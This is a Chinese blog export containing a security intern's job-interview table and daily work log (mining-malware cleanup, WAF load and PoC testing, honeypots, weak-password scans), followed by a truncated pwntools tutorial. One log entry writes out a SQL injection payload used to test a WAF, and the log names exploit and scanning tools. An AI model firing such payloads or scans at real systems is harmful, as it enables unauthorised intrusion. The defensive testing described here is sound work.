</tr>
</thead>
<tbody><tr>
<td align="center">蘑菇车帘一面-信息安全</td>
<td align="center">√</td>
<td align="center">电话面巨水且只有一面，三天后hr加微信说约下hr面拒绝了</td>
</tr>
<tr>
<td align="center">字节一面-测开</td>
<td align="center">√</td>
<td align="center">面了一个多小时巨硬核，测试到408到linux、手撕都有，主要有四个手撕：一个sql（没做出来说没怎么学sql）、一个linux命令sed(说遇到敲命令能做)、c++手撕无重复字符的最长子串（以前做过很快写出来）、python手撕无重复字符的最长子串</td>
</tr>
<tr>
<td align="center">momenta一面-信息安全</td>
<td align="center">√</td>
<td align="center">hr打电话之前说准备好编程环境，以为这个很硬，结果并没有手撕代码。大概面了十分钟，主要是自我介绍和收一下自己的实习经历就完了，大概12分钟，以为是kpi面，结果竟然还过来，而且hr说一面面试官免评挺好，震惊了</td>
</tr>
<tr>
<td align="center">滴图-测开</td>
<td align="center">√</td>
<td align="center">加了面试官微信umeet面的，感觉难度适中。主要问了实习经历，以及测试的一些基本问题如怎样测试微信点赞之类。当然也有手撕代码，一道是冒泡排序（很快写出来了，但发现有问题后面debug发现是i–写成i++了）。以及合并有序数组，直接秒了没什么好说的，然后说怎样设置测试用例，只答了正确性测试用例，后面经提醒发现还可以测试性能安全之类的，后面也是过了并且加了ld微信越了二面</td>
</tr>
<tr>
<td align="center">货拉拉-数据安全运营实习生</td>
<td align="center">×</td>
<td align="center">先是常规自我介绍，问实习。之后以为是偏web渗透测试的，结果问了好多数据安全的，比如怎样保障公司内部的数据安全，乱扯什么hash、加密、强密码，估计问题很大。之后到今天（10-18）也没有后续，肯定挂了</td>
</tr>
<tr>
<td align="center">momenta二面-信息安全</td>
<td align="center">√</td>
<td align="center">面试先自我介绍，然后问简历包括实习，edusrc漏洞怎样挖掘的，ssrf、csrf这些比较常规的安全问题。然后后面就偏聊天，问我大学读的什么专业什么研究方向，大概面了20分钟，以为寄了，结果早上面的下午1点左右hr就打电话说过了，后面的也就没面了。挺满意这个的</td>
</tr>
<tr>
<td align="center">趋动科技一面-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">纷扬科技-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">源堡科技</td>
<td align="center"></td>
<td align="center">拒绝，惊讶的是hr竟然是学姐，聊了会天</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center"></td>
<td align="center">后面的也都拒了</td>
</tr>
</tbody></table>
<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h2><h3 id="19号"><a href="#19号" class="headerlink" title="19号"></a>19号</h3><p>今天入职，体验还不错，mentor、leader都挺好、感觉很友善。</p>
<p>主要看了文档，对甲方安全有了一些了解包括甲方安全的现状、国家的一些法规、和一些设备。</p>
<p>然后主要看了云端办公的内容，主要是要做客服，应该主要回答解决别人遇到的问题包括vnc输不了密码、磁盘扩容、连接不了等问题。</p>
<h3 id="20号"><a href="#20号" class="headerlink" title="20号"></a>20号</h3><p>主要试了下公司安全设备包括绿盟RSAS（感觉界面挺丑）、奇安信天眼（beng炸弹特性奇怪、然后发现好像有IP遭了挖矿病毒，然后云了下挖矿病毒排查方法包括strace看攻击者替换二进制比如ps的一些preload劫持的dll是什么、或者使用busybox，然后试了下微步情报发现攻击IP确实是恶意IP，问了mentor说最近比较忙之后再看看）、长亭x-ray（感觉跟其它工具差不多）、深信服审计系统（只能说逆天，能看到访问招聘网站就算了连qq给谁发消息都能看到）</p>
<p>收获可能就是摸鱼学了下pwn、和学了挖矿的一些知识比如一些骚知识包括strace、busybox这些东西</p>
<p>附一些挖矿排除链接：</p>
<p><a href="https://ti.qianxin.com/uploads/2021/11/18/f4dd5058aed06883e8cb7fecf3286b1f.pdf">ti.qianxin.com&#x2F;uploads&#x2F;2021&#x2F;11&#x2F;18&#x2F;f4dd5058aed06883e8cb7fecf3286b1f.pdf</a> </p>
<p><a href="https://www.freebuf.com/articles/paper/305589.html">深度解析恶意挖矿攻击：现状、检测及处置手册 - FreeBuf网络安全行业门户</a> </p>
<p><a href="https://www.freebuf.com/articles/web/271281.html">应急响应：记一次花样贼多的挖矿病毒 - FreeBuf网络安全行业门户</a></p>
<h3 id="23日"><a href="#23日" class="headerlink" title="23日"></a>23日</h3><p>主要看了下奇安信的探针和分析平台，导师说了下公司北京和苏州的拓扑情况，明天奇安信的人来培训一下天眼的使用。、</p>
<p>附一些名词，今天初步接触的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDC：https://www.zhihu.com/question/40534161</span><br><span class="line">aws：https://aws.amazon.com/cn/ </span><br><span class="line">VPC：https://info.support.huawei.com/info-finder/encyclopedia/zh/VPC.html</span><br><span class="line">SOC：https://zhuanlan.zhihu.com/p/654413867</span><br><span class="line">SDL：https://zhuanlan.zhihu.com/p/252325178</span><br></pre></td></tr></table></figure>

<p>然后查找poc工具，以及一些编码绕过的poc来对之后的和长亭合作的产品进行合作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc工具</span><br><span class="line">https://github.com/tr0uble-mAker/POC-bomber </span><br><span class="line">感觉还挺好用</span><br></pre></td></tr></table></figure>

<p>以及大佬文章简单看了下，对安全体系有了从0到0.000000000001的深入了解：</p>
<p>poc工具</p>
<p><a href="https://github.com/tr0uble-mAker/POC-bomber">https://github.com/tr0uble-mAker/POC-bomber</a></p>
<p>收获就是对甲方安全或者说是公司安全有了更深的了解，也脱离对安全就是渗透测试的一些浅显认识。</p>
<h3 id="24日"><a href="#24日" class="headerlink" title="24日"></a>24日</h3><p>今天早上跟着导师和长亭的讨论了waf工具的测试包括poc测试、压测、串行测试、并行测试。</p>
<p>进行poc的收集。</p>
<p>然后对甲方安全有了更深的了解，包括其体制建设、其内部的各种安全机制，看大佬文章确实对安全的认识深了很多<a href="https://www.zhihu.com/people/elknot">e1knot - 知乎 (zhihu.com)</a></p>
<p>安全不是仅仅渗透测试，渗透测试仅仅是评估安全的工具。安全更重要的是要企业内部建立起好的安全机制，好好运营。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IOC：https://blog.csdn.net/xyx112/article/details/130693588#</span><br><span class="line">SIEM：https://www.ibm.com/cn-zh/topics/siem</span><br></pre></td></tr></table></figure>

<h3 id="25日"><a href="#25日" class="headerlink" title="25日"></a>25日</h3><p>请了一天假</p>
<h3 id="26日"><a href="#26日" class="headerlink" title="26日"></a>26日</h3><p>看了长亭测试waf的压测文档，学了其测试思想。学了wrk2控制RPS测试waf看性能的对应内容，输出了压测文档，也让导师看了comment了。</p>
<p>同时也写了了poc测试计划，整理好了表格及标题，到时候直接将测试结果放在表格上即可。</p>
<p>然后其余时间就摸摸鱼看看安全公众号或者安全文档或者看看研究生导师杨老师组网站的对应PPT。</p>
<p>入职也一周了，体验目前很好，感觉人都很nice。</p>
<p>也对WAF的原理有了更深的了解，比如长亭雷池WAF原理就是反向代理，应该熟悉WAF了也能对以后绕WAF能力提升有帮助。</p>
<h3 id="27日"><a href="#27日" class="headerlink" title="27日"></a>27日</h3><p>今天主要进行poc和压测的正式测试。</p>
<p>poc测试就是输入危险payload看能不能检测到，以及输出对应表格。</p>
<p>然后是压测，遇到了一系列问题，长亭雷池先是没配https导致有些问题。后面开始压测发现雷池显示的请求数跟wrk2 RQS对不上而且返回速度很慢，经过排查发现是server服务器性能不太好，处理不了。之后就压测时请求url加了?id&#x3D;1’ union select 1,database()–+这种，这种会被waf拦截，到不了服务器，性能就正常了，就直接拦截不会到服务器，就能正常测试了。</p>
<p>对正向代理、方向代理、waf原理有了更深的理解。</p>
<h3 id="30日"><a href="#30日" class="headerlink" title="30日"></a>30日</h3><p>裂开，被挖矿了，早上10：00忙到晚上12：00</p>
<h3 id="31日"><a href="#31日" class="headerlink" title="31日"></a>31日</h3><p>当客服的一天，也顺便帮忙挖矿排查，又有其它地区被感染了</p>
<p>nnnd，网上看别人排除挖矿多轻松，这里找就巨麻烦，还有两个奇安信的人帮忙都很麻烦</p>
<p>挖矿参考：<a href="https://zhuanlan.zhihu.com/p/108688360">挖矿应急响应小结 - 知乎 (zhihu.com)</a></p>
<h2 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h2><h3 id="01日"><a href="#01日" class="headerlink" title="01日"></a>01日</h3><p>挖矿时间基本结尾，处置了没有及时清理的还有挖矿病毒的机器。学了一下iptables</p>
<h3 id="02日"><a href="#02日" class="headerlink" title="02日"></a>02日</h3><p>云端办公小客服。云端办公进行了最简单的弱口令检查，之后计划加入momenta、passwd、qwerty特征进行弱口令检查以及进行未授权访问排除。</p>
<p>进行了长亭waf压测，awk真好用，学了iptables（没太懂）</p>
<p>进入正常实习生活，之前被挖矿的几天是真的累。</p>
<h3 id="03日"><a href="#03日" class="headerlink" title="03日"></a>03日</h3><p>请了半天假开了组会。</p>
<p>写了个python脚本查中毒机器，并进行处理。看华为云、天眼发现报警，攻击者为外网IP忽略，为内网Ip找人查毒。</p>
<h3 id="06日"><a href="#06日" class="headerlink" title="06日"></a>06日</h3><p><del>发工资了，干劲又多了好多</del></p>
<p>看华为云、奇安信天眼日常看有问题没有，python脚本查毒，三四个有毒。</p>
<p>然后这边甲方安全不只搞安全，还接云端办公充实工作量，调研了（打语音电话）重点部门访谈使用体验和建议。</p>
<p>甲方安全还是爽。</p>
<h3 id="07日"><a href="#07日" class="headerlink" title="07日"></a>07日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，一个有毒。</p>
<p>然后和导师对了下公司弱口令排除的事情，明天在跟另外一个导师对就可以了。</p>
<p>下午几乎刷了一下午的lc sql，还挺爽。现在能够乱杀之前字节实习面试的sql题了（确信（bushi））</p>
<h3 id="08日"><a href="#08日" class="headerlink" title="08日"></a>08日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。和导师设置了云端办公问卷。</p>
<p>摸鱼刷了会sql，争取这个月把sql五页题水完。（现在已经进入光明正大摸鱼阶段了）</p>
<p>跟长亭沟通了之前的WAF测试计划，也对nginx这些负载均衡有了解，以及负载间https、http这些变化了些数。<a href="https://blog.csdn.net/wufangliang/article/details/103331357">https 下 多级nginx 反向代理设置_x-forwarded-proto $scheme-CSDN博客</a></p>
<h3 id="09日"><a href="#09日" class="headerlink" title="09日"></a>09日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。华为云发现一个内网爆破，应该是有毒的。以及弱口令找到了个1的密码整治了。发问卷发了50份。</p>
<p>下午办公助手和waf搭建沟通，第二天测试安waf前后差别。然后还是摸鱼刷会sql题。</p>
<h3 id="10号"><a href="#10号" class="headerlink" title="10号"></a>10号</h3><p>请了半天假，日常活。</p>
<h3 id="13、14、15、16、17日"><a href="#13、14、15、16、17日" class="headerlink" title="13、14、15、16、17日"></a>13、14、15、16、17日</h3><p>日常活。</p>
<h3 id="20日"><a href="#20日" class="headerlink" title="20日"></a>20日</h3><p>发现挖矿，top没找到很高的CPU，以为top被劫持了，使用busybox查看还是没有。</p>
<p>直接netstat -antp 找外网连接，发现一个奇怪的发现是病毒。systemctl status pid,看对应信息，然后exe交到微步，看看威胁情报。</p>
<p>后面复盘为什么top不高，发现可能是因为之前封了矿池的dns，病毒下载不到对应东西，所以没有挖矿起来。</p>
<h3 id="21日"><a href="#21日" class="headerlink" title="21日"></a>21日</h3><p>搭建了蜜罐HFISH，感觉还挺好用。</p>
<p>又被挖矿勒，现在会溯源了，知道怎样排查从哪来了，现在是挖矿排查糕手。其它就是些日常活。</p>
<h3 id="22、23日"><a href="#22、23日" class="headerlink" title="22、23日"></a>22、23日</h3><p>测试蜜罐跟微步情报和飞书结合，感觉挺好用。</p>
<p>有机器中毒了，上去找了半天有没找到毒，希望之后能够得出结论。</p>
<h3 id="24日-1"><a href="#24日-1" class="headerlink" title="24日"></a>24日</h3><p>安了msf，熟练了msf使用遇事不决就</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info d</span><br></pre></td></tr></table></figure>

<p>fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/nanhe7/p/15966742.htm</span><br></pre></td></tr></table></figure>

<h3 id="27日、28日"><a href="#27日、28日" class="headerlink" title="27日、28日"></a>27日、28日</h3><p>干杂活刷leetcode摸鱼的一天</p>
<h3 id="29日、30日"><a href="#29日、30日" class="headerlink" title="29日、30日"></a>29日、30日</h3><p>干杂活、绿盟扫，看漏洞。和知道创宇的讨论渗透测试服务。</p>
<h2 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h2><h3 id="01日-1"><a href="#01日-1" class="headerlink" title="01日"></a>01日</h3><p>请了半天假，还是日常活。之后好像有两家公司（360、知道创宇）要来攻防演练，希望能够有意思qaq</p>
<p><del>360提了两种放置：众测、人力天，现在才知道众测算是被白嫖了。。。</del></p>
<h3 id="04日"><a href="#04日" class="headerlink" title="04日"></a>04日</h3><p>fscan扫了下云端办公网段，发现不少弱口令，还有hadoop未授权访问。也扫了华为云、阿里云，然后就是些日常活</p>
<h3 id="05日"><a href="#05日" class="headerlink" title="05日"></a>05日</h3><p>日常活，摸鱼，搭waf，看雷池api，超级弱口令扫弱密码<a href="https://zhuanlan.zhihu.com/p/543309378">【附下载】爆破神器之超级弱口令检查工具使用 - 知乎 (zhihu.com)</a>，明天批量改密码</p>
<h3 id="06日-1"><a href="#06日-1" class="headerlink" title="06日"></a>06日</h3><p>发工资了，上w爽死了</p>
<p>日常活加写批量修改密码脚本。然后搭建yadcc环境，争取把源码看懂，和项目结构及对应配置看懂。</p>
<h3 id="07、08"><a href="#07、08" class="headerlink" title="07、08"></a>07、08</h3><p>yadcc</p>
<h3 id="11-15日"><a href="#11-15日" class="headerlink" title="11-15日"></a>11-15日</h3><p>日常活。学了下go。了解了分布式编译跑起来了yadcc、icecc。看了yadcc部分源码。<del>开始肝mit 854分布式lab</del></p>
<h3 id="18日"><a href="#18日" class="headerlink" title="18日"></a>18日</h3><p>发现挖矿机器，直接秒了（hadoop未授权访问，没啥好说的）</p>
<p>burp-autodecoder 还挺好用，能够爆破进行签名校验的网页。zoomeye试了下公司账号发现不如fofa一根，资产巨少</p>
<p>摸鱼（</p>
<h3 id="19、20日"><a href="#19、20日" class="headerlink" title="19、20日"></a>19、20日</h3><p>写蜜罐文档，已经开始在每个b端搭建蜜罐了</p>
<h3 id="21日-1"><a href="#21日-1" class="headerlink" title="21日"></a>21日</h3><p>处理前天蜜罐发现的中毒机器，找了半天，nmmd在docker里面，真逆天</p>
<p>ps -ef 半天没啥有效信息，后面换成了 ps -elf</p>
<h3 id="25日、26日"><a href="#25日、26日" class="headerlink" title="25日、26日"></a>25日、26日</h3><p>摸鱼加杂活。绩效又a，我爱momenta</p>
<h3 id="27日-1"><a href="#27日-1" class="headerlink" title="27日"></a>27日</h3><p>有台机器挖矿还是命令执行的，以为弱口令进来的爆了半天。结果是开了vscode server，whoami直接是root，服了</p>
<h3 id="28日"><a href="#28日" class="headerlink" title="28日"></a>28日</h3><p>处理hdmap的出网域名，发现三个未授权访问。被批评工具一知半解，fscan、绿盟之前都不是全端口扫描</p>
<h3 id="29日"><a href="#29日" class="headerlink" title="29日"></a>29日</h3><p>日常活。要放假了大家都比较兴奋哈哈哈</p>
<h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><h3 id="02日-1"><a href="#02日-1" class="headerlink" title="02日"></a>02日</h3><p>日常活</p>
<h3 id="03日-1"><a href="#03日-1" class="headerlink" title="03日"></a>03日</h3><p>呜呜呜，导师劝我好好研究研究代码，了解漏洞原理，还说有问题问她，太好了吧。</p>
<p>360渗透测试还是牛逼，直接钓鱼钓到了两个hr，直接cs上线了</p>
<h3 id="04日-1"><a href="#04日-1" class="headerlink" title="04日"></a>04日</h3><p>摸鱼复现大头ctf加日常活</p>
<h3 id="05日-1"><a href="#05日-1" class="headerlink" title="05日"></a>05日</h3><p>蜜罐终于要在每个B段搭好了，找人真麻烦。</p>
<p>感觉自己ctf水平跟之前比有质的提高，果然自己学学spring、go什么的还挺有用。</p>
<p>java 那些链感觉也有数了，能从更高的视角来看了。</p>
<p><a href="https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/">https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/</a></p>
<p><a href="https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/">https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<h3 id="08-20日"><a href="#08-20日" class="headerlink" title="08-20日"></a>08-20日</h3><p>开始写自动化代码了，WAF批量搭建、批量探活。</p>
<p>参与soc平台：flask+celery+sqlalchemy+ redis</p>
<p>代码水平极具增强但也很累。。。</p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2023/04/18/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">ctfshow-pwn新手系列_ctfshow pwn_Rocl5的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/m0_46483584/article/details/110259127">ctfshow pwn题学习笔记_Scarehehe的博客-CSDN博客</a></p>
<span id="more"></span>

<h2 id="pwn中的保护"><a href="#pwn中的保护" class="headerlink" title="pwn中的保护"></a>pwn中的保护</h2><p><a href="https://blog.csdn.net/qq_44108455/article/details/104985351">pwn学习—保护机制_gclome的博客-CSDN博客</a></p>
<p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<h2 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h2><p><a href="https://blog.csdn.net/A951860555/article/details/110990925">pwntools工具的使用（随时更新中…）___lifanxin的博客-CSDN博客</a></p>
<p>我们本地写一个猜数游戏进行测试用来学习</p>
<p>c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> secretNumber, userGuess;</span><br><span class="line">    <span class="type">int</span> attempts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化随机数生成器</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个 1 到 10000 的随机数</span></span><br><span class="line">    secretNumber = rand() % <span class="number">10000</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;猜一个 1 到 10000 之间的数字。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环，直到用户猜到正确的数字</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input your num:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;userGuess);</span><br><span class="line">        attempts++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userGuess == secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;success！\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;tyr %d times。\n&quot;</span>, attempts);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userGuess &lt; secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;low\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;big\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -m32 guessNum.c -o guessNum</span><br></pre></td></tr></table></figure>

<p>在 GCC 编译器中，<code>-m32</code> 是一个编译选项，它指示编译器为 32 位目标架构生成代码。换句话说，它会告诉 GCC 生成 32 位可执行文件，而不是默认的 64 位可执行文件（假设你的系统默认是 64 位的）。</p>
<p>当使用 <code>-m32</code> 选项编译程序时，确保已安装了 32 位库和开发工具。在某些操作系统上，可能需要额外安装这些库和工具。例如，在 Ubuntu 上，你需要安装 <code>gcc-multilib</code> 和 <code>g++-multilib</code> 包，以便在 64 位系统上编译 32 位程序。</p>
<p>玩游戏：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">game = process(<span class="string">&#x27;./guessNum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">game.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lower_bound = <span class="number">1</span></span><br><span class="line">upper_bound = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    guess = (lower_bound + upper_bound) // <span class="number">2</span></span><br><span class="line">    response = game.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">	game.sendline(<span class="built_in">str</span>(guess))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;low&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        lower_bound = guess + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;big&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        upper_bound = guess - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess:&quot;</span>, guess)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, response)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3617</span><br><span class="line">(&#x27;sucess:&#x27;, 9039)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3617)</span><br><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3656</span><br><span class="line">(&#x27;sucess:&#x27;, 1289)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3656)</span><br></pre></td></tr></table></figure>



<h3 id="引入pwntools库"><a href="#引入pwntools库" class="headerlink" title="引入pwntools库"></a>引入pwntools库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<h3 id="绑定要处理的程序"><a href="#绑定要处理的程序" class="headerlink" title="绑定要处理的程序"></a>绑定要处理的程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="设置上下文环境"><a href="#设置上下文环境" class="headerlink" title="设置上下文环境"></a>设置上下文环境</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="获取程序输出"><a href="#获取程序输出" class="headerlink" title="获取程序输出"></a>获取程序输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment"># 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure>

<h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure>

<h3 id="实现输入"><a href="#实现输入" class="headerlink" title="实现输入"></a>实现输入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;hello!&#x27;</span>      <span class="comment"># python3，payload为字节类型</span></span><br><span class="line">p.sendline(payload)      <span class="comment"># 输入hello! + \n</span></span><br><span class="line">p.send(payload)          <span class="comment"># 输入hello!</span></span><br><span class="line">p.sendafter(<span class="string">&quot;test&quot;</span>, payload)      <span class="comment"># 在接受到test后才发送payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;test&quot;</span>, payload)  <span class="comment"># 在接受到test后才发送payload + \n</span></span><br></pre></td></tr></table></figure>

<h3 id="实现交互"><a href="#实现交互" class="headerlink" title="实现交互"></a>实现交互</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="获取程序或者libc中的信息"><a href="#获取程序或者libc中的信息" class="headerlink" title="获取程序或者libc中的信息"></a>获取程序或者libc中的信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = 